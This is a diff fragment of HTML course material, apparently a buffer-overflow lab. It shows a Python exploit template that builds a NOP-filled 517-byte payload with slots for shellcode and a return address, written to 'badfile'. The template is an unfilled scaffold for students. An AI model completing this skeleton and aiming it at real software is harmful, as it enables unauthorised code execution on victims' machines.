-<span id="cb15-9"><a href="#cb15-9"></a></span>
-<span id="cb15-10"><a href="#cb15-10"></a><span class="co"># Fill the content with NOP&#39;s</span></span>
-<span id="cb15-11"><a href="#cb15-11"></a>content <span class="op">=</span> <span class="bu">bytearray</span>(<span class="bn">0x90</span> <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">517</span>)) </span>
-<span id="cb15-12"><a href="#cb15-12"></a></span>
-<span id="cb15-13"><a href="#cb15-13"></a><span class="co">##################################################################</span></span>
-<span id="cb15-14"><a href="#cb15-14"></a><span class="co"># Put the shellcode somewhere in the payload</span></span>
-<span id="cb15-15"><a href="#cb15-15"></a>start <span class="op">=</span> <span class="dv">0</span>               <span class="co"># Change this number </span></span>
-<span id="cb15-16"><a href="#cb15-16"></a>content[start:start <span class="op">+</span> <span class="bu">len</span>(shellcode)] <span class="op">=</span> shellcode</span>
-<span id="cb15-17"><a href="#cb15-17"></a></span>
-<span id="cb15-18"><a href="#cb15-18"></a><span class="co"># Decide the return address value </span></span>
-<span id="cb15-19"><a href="#cb15-19"></a><span class="co"># and put it somewhere in the payload</span></span>
-<span id="cb15-20"><a href="#cb15-20"></a>ret    <span class="op">=</span> <span class="bn">0x00</span>           <span class="co"># Change this number </span></span>
-<span id="cb15-21"><a href="#cb15-21"></a>offset <span class="op">=</span> <span class="dv">0</span>              <span class="co"># Change this number </span></span>
-<span id="cb15-22"><a href="#cb15-22"></a></span>
-<span id="cb15-23"><a href="#cb15-23"></a>L <span class="op">=</span> <span class="dv">4</span>     <span class="co"># Use 4 for 32-bit address and 8 for 64-bit address</span></span>
-<span id="cb15-24"><a href="#cb15-24"></a>content[offset:offset <span class="op">+</span> L] <span class="op">=</span> (ret).to_bytes(L,byteorder<span class="op">=</span><span class="st">&#39;little&#39;</span>) </span>
-<span id="cb15-25"><a href="#cb15-25"></a><span class="co">##################################################################</span></span>
-<span id="cb15-26"><a href="#cb15-26"></a></span>
-<span id="cb15-27"><a href="#cb15-27"></a><span class="co"># Write the content to a file</span></span>
-<span id="cb15-28"><a href="#cb15-28"></a><span class="cf">with</span> <span class="bu">open</span>(<span class="st">&#39;badfile&#39;</span>, <span class="st">&#39;wb&#39;</span>) <span class="im">as</span> f:</span>
-<span id="cb15-29"><a href="#cb15-29"></a>  f.write(content)</span></code></pre></div>
+<div class="sourceCode" id="cb16"><pre class="sourceCode numberSource python numberLines"><code class="sourceCode python"><span id="cb16-1"><a href="#cb16-1"></a><span class="co">#!/usr/bin/python3</span></span>
+<span id="cb16-2"><a href="#cb16-2"></a><span class="im">import</span> sys</span>
+<span id="cb16-3"><a href="#cb16-3"></a></span>
+<span id="cb16-4"><a href="#cb16-4"></a><span class="co"># Replace the content with the actual shellcode</span></span>
+<span id="cb16-5"><a href="#cb16-5"></a>shellcode<span class="op">=</span> (</span>
+<span id="cb16-6"><a href="#cb16-6"></a>  <span class="st">&quot;</span><span class="ch">\x90\x90\x90\x90</span><span class="st">&quot;</span>  </span>
+<span id="cb16-7"><a href="#cb16-7"></a>  <span class="st">&quot;</span><span class="ch">\x90\x90\x90\x90</span><span class="st">&quot;</span>  </span>
+<span id="cb16-8"><a href="#cb16-8"></a>).encode(<span class="st">&#39;latin-1&#39;</span>)</span>
+<span id="cb16-9"><a href="#cb16-9"></a></span>
+<span id="cb16-10"><a href="#cb16-10"></a><span class="co"># Fill the content with NOP&#39;s</span></span>
+<span id="cb16-11"><a href="#cb16-11"></a>content <span class="op">=</span> <span class="bu">bytearray</span>(<span class="bn">0x90</span> <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">517</span>)) </span>
+<span id="cb16-12"><a href="#cb16-12"></a></span>
+<span id="cb16-13"><a href="#cb16-13"></a><span class="co">##################################################################</span></span>
+<span id="cb16-14"><a href="#cb16-14"></a><span class="co"># Put the shellcode somewhere in the payload</span></span>
+<span id="cb16-15"><a href="#cb16-15"></a>start <span class="op">=</span> <span class="dv">0</span>               <span class="co"># Change this number </span></span>
+<span id="cb16-16"><a href="#cb16-16"></a>content[start:start <span class="op">+</span> <span class="bu">len</span>(shellcode)] <span class="op">=</span> shellcode</span>
+<span id="cb16-17"><a href="#cb16-17"></a></span>
+<span id="cb16-18"><a href="#cb16-18"></a><span class="co"># Decide the return address value </span></span>
+<span id="cb16-19"><a href="#cb16-19"></a><span class="co"># and put it somewhere in the payload</span></span>
+<span id="cb16-20"><a href="#cb16-20"></a>ret    <span class="op">=</span> <span class="bn">0x00</span>           <span class="co"># Change this number </span></span>
+<span id="cb16-21"><a href="#cb16-21"></a>offset <span class="op">=</span> <span class="dv">0</span>              <span class="co"># Change this number </span></span>
+<span id="cb16-22"><a href="#cb16-22"></a></span>
+<span id="cb16-23"><a href="#cb16-23"></a>L <span class="op">=</span> <span class="dv">4</span>     <span class="co"># Use 4 for 32-bit address and 8 for 64-bit address</span></span>
+<span id="cb16-24"><a href="#cb16-24"></a>content[offset:offset <span class="op">+</span> L] <span class="op">=</span> (ret).to_bytes(L,byteorder<span class="op">=</span><span class="st">&#39;little&#39;</span>) </span>
+<span id="cb16-25"><a href="#cb16-25"></a><span class="co">##################################################################</span></span>
+<span id="cb16-26"><a href="#cb16-26"></a></span>
+<span id="cb16-27"><a href="#cb16-27"></a><span class="co"># Write the content to a file</span></span>
+<span id="cb16-28"><a href="#cb16-28"></a><span class="cf">with</span> <span class="bu">open</span>(<span class="st">&#39;badfile&#39;</span>, <span class="st">&#39;wb&#39;</span>) <span class="im">as</span> f:</span>
+<span id="cb16-29"><a href="#cb16-29"></a>  f.write(content)</span></code></pre></div>
 <p>You will need to change the <code>exploit.py</code> code to:</p>
 <ul>
 <li>Write the correct sequence of shellcode bytes, at line 5.
